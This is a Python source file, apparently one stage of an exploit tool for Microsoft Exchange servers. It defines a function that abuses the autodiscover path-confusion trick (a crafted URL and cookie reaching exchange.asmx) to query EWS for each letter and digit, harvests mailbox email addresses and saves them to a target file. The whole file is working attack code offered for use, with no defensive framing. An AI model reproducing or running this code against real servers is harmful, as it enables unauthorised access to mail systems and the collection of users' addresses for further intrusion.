from main import *

def GetAllMails(target):
    logger.debug("[Stage 444] Get 100 email users from every alphanum letters")
    mailboxes = []
    letters = list(map(chr, range(97, 123))) + list(map(chr, range(48, 58)))
    for letter in letters:
        try:
            soap_body = convertFromTemplate({'letter': str(letter)}, templatesFolder + "GetMailBoxes.xml")
            stage444 = requests.post(
                f"https://{target}/autodiscover/autodiscover.json?a=fun@fuk.fuk/ews/exchange.asmx",
                headers={
                    "Content-Type": "text/xml",
                    "User-Agent": user_agent,
                    "Cookie": "Email=autodiscover/autodiscover.json?a=fun@fuk.fuk"
                },
                data=soap_body,
                timeout=300,
                verify=False
            )
            # If status code 200 is NOT returned, the request failed
            if stage444.status_code != 200:
                logger.error("[Stage 444] Get 100 email users Error! ResponseCode:{}".format(stage444.status_code))

            folderXML = ET.fromstring(stage444.content.decode())
            for item in folderXML.findall(".//t:EmailAddress", exchangeNamespace):
                mailboxes.append(item.text)
        except Exception as e:
            logger.error(e)
            break
    file1 = open(target + ".tgt", 'a').writelines('\n'.join(mailboxes))
    return mailboxes